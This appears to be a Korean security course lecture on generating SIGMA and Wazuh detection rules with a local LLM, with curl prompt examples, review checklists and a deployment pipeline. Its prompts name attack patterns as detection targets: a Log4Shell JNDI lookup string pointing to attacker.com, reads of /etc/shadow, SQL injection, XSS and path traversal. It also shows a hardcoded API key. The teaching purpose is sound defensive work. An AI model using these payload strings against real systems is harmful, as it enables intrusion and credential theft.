# Week 05: 탐지 룰 자동 생성

## 학습 목표
- SIGMA 룰과 Wazuh 룰의 구조를 이해한다
- LLM을 활용하여 공격 패턴에서 탐지 룰을 자동 생성할 수 있다
- 생성된 룰의 품질을 검증하는 방법을 익힌다
- 룰 생성 파이프라인을 구축할 수 있다

---

## 1. 탐지 룰이란?

보안 이벤트에서 위협을 식별하기 위한 조건 집합이다.
"이러한 패턴이 발견되면 알림을 발생시켜라"는 규칙이다.

### 룰 포맷 비교

| 포맷 | 특징 | 대상 |
|------|------|------|
| **SIGMA** | 범용, SIEM 독립적 | 다양한 SIEM으로 변환 가능 |
| **Wazuh** | Wazuh 전용 XML | Wazuh SIEM |
| **Suricata** | 네트워크 IPS | 네트워크 트래픽 |
| **YARA** | 파일/메모리 패턴 | 악성코드 탐지 |

---

## 2. SIGMA 룰 구조

```yaml
title: SSH Brute Force Detection
id: a1234567-b890-cdef-0123-456789abcdef
status: experimental
description: Detects SSH brute force attempts
author: Security Team
date: 2026/03/27
logsource:
  product: linux
  service: sshd
detection:
  selection:
    EventType: "authentication_failure"
    TargetUserName: "root"
  condition: selection | count() > 5
  timeframe: 5m
level: high
tags:
  - attack.credential_access
  - attack.t1110.001
falsepositives:
  - Users who forgot their password
```

### SIGMA 핵심 필드

| 필드 | 설명 |
|------|------|
| logsource | 로그 출처 (OS, 서비스) |
| detection | 탐지 조건 (selection + condition) |
| level | 심각도 (informational/low/medium/high/critical) |
| tags | MITRE ATT&CK 매핑 |

---

## 3. Wazuh 룰 구조

```xml
<group name="sshd,authentication_failed">
  <rule id="100001" level="10">
    <if_sid>5710</if_sid>
    <match>Failed password for root</match>
    <frequency>5</frequency>
    <timeframe>300</timeframe>
    <description>SSH brute force against root detected</description>
    <mitre>
      <id>T1110.001</id>
    </mitre>
    <group>authentication_failures,</group>
  </rule>
</group>
```

### Wazuh 룰 핵심 요소

| 요소 | 설명 |
|------|------|
| `<if_sid>` | 부모 룰 ID (이 룰이 먼저 발동해야 함) |
| `<match>` | 로그에서 찾을 문자열 |
| `<regex>` | 정규식 매칭 |
| `<frequency>` | 발생 횟수 조건 |
| `<timeframe>` | 시간 범위 (초) |
| `<description>` | 알림 설명 |

---

## 4. LLM으로 탐지 룰 생성

### 4.1 공격 설명에서 SIGMA 룰 생성

```bash
curl -s http://192.168.0.105:11434/v1/chat/completions \
  -H "Content-Type: application/json" \
  -d '{
    "model": "gemma3:12b",
    "messages": [
      {"role": "system", "content": "SIGMA 룰 전문가입니다. 공격 설명을 받아 SIGMA 룰을 YAML 형식으로 생성합니다. 반드시 유효한 SIGMA 포맷을 따르세요."},
      {"role": "user", "content": "다음 공격에 대한 SIGMA 탐지 룰을 생성해주세요:\n\n공격: 리눅스 서버에서 권한 상승 시도\n패턴: 일반 사용자가 /etc/shadow 파일을 읽으려는 시도\n로그 소스: Linux auditd\nMITRE: T1003.008 (Credentials from Password Store)"}
    ],
    "temperature": 0.2
  }' | python3 -c "import json,sys; print(json.load(sys.stdin)['choices'][0]['message']['content'])"
```

### 4.2 로그 샘플에서 Wazuh 룰 생성

```bash
curl -s http://192.168.0.105:11434/v1/chat/completions \
  -H "Content-Type: application/json" \
  -d '{
    "model": "gemma3:12b",
    "messages": [
      {"role": "system", "content": "Wazuh 룰 전문가입니다. 로그 샘플을 분석하여 Wazuh XML 룰을 생성합니다. rule id는 100000-109999 범위를 사용하세요."},
      {"role": "user", "content": "다음 로그 패턴을 탐지하는 Wazuh 룰을 만들어주세요:\n\n로그 샘플:\nMar 27 10:15:00 web apache2[5678]: [error] [client 203.0.113.50] File does not exist: /var/www/html/wp-login.php\nMar 27 10:15:01 web apache2[5678]: [error] [client 203.0.113.50] File does not exist: /var/www/html/wp-admin\nMar 27 10:15:02 web apache2[5678]: [error] [client 203.0.113.50] File does not exist: /var/www/html/administrator\n\n탐지 목적: WordPress/CMS 디렉토리 스캔 탐지\n조건: 같은 IP에서 5분 내 10회 이상 존재하지 않는 CMS 경로 접근"}
    ],
    "temperature": 0.2
  }' | python3 -c "import json,sys; print(json.load(sys.stdin)['choices'][0]['message']['content'])"
```

### 4.3 CVE에서 탐지 룰 생성

```bash
curl -s http://192.168.0.105:11434/v1/chat/completions \
  -H "Content-Type: application/json" \
  -d '{
    "model": "gemma3:12b",
    "messages": [
      {"role": "system", "content": "보안 탐지 엔지니어입니다. CVE 정보를 기반으로 SIGMA 룰과 Suricata 룰을 모두 생성합니다."},
      {"role": "user", "content": "CVE-2021-44228 (Log4Shell)에 대한 탐지 룰을 생성하세요.\n\n공격 패턴: HTTP 요청에 ${jndi:ldap://attacker.com/exploit} 문자열 포함\n로그 소스: 웹 서버 접근 로그, 네트워크 트래픽\n\nSIGMA 룰과 Suricata 룰을 각각 생성하세요."}
    ],
    "temperature": 0.2
  }' | python3 -c "import json,sys; print(json.load(sys.stdin)['choices'][0]['message']['content'])"
```

---

## 5. 룰 품질 검증

### 5.1 LLM으로 룰 리뷰

```bash
RULE='<rule id="100010" level="12">
  <match>select.*from.*information_schema</match>
  <description>SQL Injection attempt detected</description>
</rule>'

curl -s http://192.168.0.105:11434/v1/chat/completions \
  -H "Content-Type: application/json" \
  -d "{
    \"model\": \"gemma3:12b\",
    \"messages\": [
      {\"role\": \"system\", \"content\": \"Wazuh 룰 리뷰어입니다. 룰의 품질을 평가하고 개선 사항을 제시하세요.\\n평가 항목: 1.정확성 2.오탐률 3.우회 가능성 4.성능 영향 5.개선 제안\"},
      {\"role\": \"user\", \"content\": \"다음 Wazuh 룰을 리뷰해주세요:\\n$RULE\"}
    ],
    \"temperature\": 0.3
  }" | python3 -c "import json,sys; print(json.load(sys.stdin)['choices'][0]['message']['content'])"
```

### 5.2 검증 체크리스트

| 항목 | 확인 내용 |
|------|----------|
| 정확성 | 의도한 공격을 탐지하는가? |
| 오탐률 | 정상 활동에 알림이 발생하지 않는가? |
| 우회 | 인코딩, 대소문자 변환으로 우회 가능한가? |
| 성능 | 정규식이 과도하게 복잡하지 않은가? |
| MITRE | ATT&CK 기법이 올바르게 매핑되었는가? |

---

## 6. 실습

### 실습 1: SSH 공격 탐지 룰 생성 및 검증

```bash
# Step 1: 공격 설명으로 룰 생성
curl -s http://192.168.0.105:11434/v1/chat/completions \
  -H "Content-Type: application/json" \
  -d '{
    "model": "gemma3:12b",
    "messages": [
      {"role": "system", "content": "Wazuh 룰 전문가입니다."},
      {"role": "user", "content": "SSH에서 존재하지 않는 사용자로 로그인 시도를 탐지하는 Wazuh 룰을 생성하세요. 5분 내 3회 이상이면 알림."}
    ],
    "temperature": 0.2
  }' | python3 -c "import json,sys; print(json.load(sys.stdin)['choices'][0]['message']['content'])"
```

```bash
# Step 2: 생성된 룰 리뷰 요청
# (위에서 생성된 룰을 복사하여 리뷰 프롬프트에 입력)
```

### 실습 2: 웹 공격 SIGMA 룰 생성

```bash
curl -s http://192.168.0.105:11434/v1/chat/completions \
  -H "Content-Type: application/json" \
  -d '{
    "model": "gemma3:12b",
    "messages": [
      {"role": "system", "content": "SIGMA 룰 전문가입니다."},
      {"role": "user", "content": "다음 웹 공격 패턴들을 탐지하는 SIGMA 룰 3개를 생성하세요:\n1. SQL Injection (union select 패턴)\n2. XSS (script 태그 삽입)\n3. Path Traversal (../../etc/passwd)\n\n각 룰에 MITRE ATT&CK 태그를 포함하세요."}
    ],
    "temperature": 0.3
  }' | python3 -c "import json,sys; print(json.load(sys.stdin)['choices'][0]['message']['content'])"
```

### 실습 3: OpsClaw로 룰 배포 자동화

```bash
# 생성된 룰을 siem 서버에 배포하는 워크플로
curl -s -X POST http://localhost:8000/projects \
  -H "Content-Type: application/json" \
  -H "X-API-Key: opsclaw-api-key-2026" \
  -d '{
    "name": "deploy-detection-rule",
    "request_text": "LLM 생성 탐지 룰을 Wazuh에 배포",
    "master_mode": "external"
  }'
```

---

## 7. 룰 생성 파이프라인

```
위협 인텔리전스 (CTI)
  ↓
공격 패턴 추출
  ↓
LLM 룰 생성 (SIGMA/Wazuh)
  ↓
LLM 룰 리뷰 (품질 검증)
  ↓
테스트 환경 검증
  ↓
프로덕션 배포
  ↓
오탐/미탐 피드백 → LLM 재학습
```

---

## 핵심 정리

1. SIGMA는 범용 탐지 룰 포맷으로 다양한 SIEM에서 사용 가능하다
2. LLM은 공격 설명, 로그 샘플, CVE 정보에서 탐지 룰을 자동 생성한다
3. 생성된 룰은 반드시 정확성, 오탐률, 우회 가능성을 검증해야 한다
4. 룰 생성 → 리뷰 → 테스트 → 배포 → 피드백의 파이프라인을 구축한다
5. LLM이 생성한 룰은 출발점이며, 전문가 검증이 필수이다

---

## 다음 주 예고
- Week 06: 취약점 분석 - LLM을 활용한 코드 리뷰와 CVE 분석
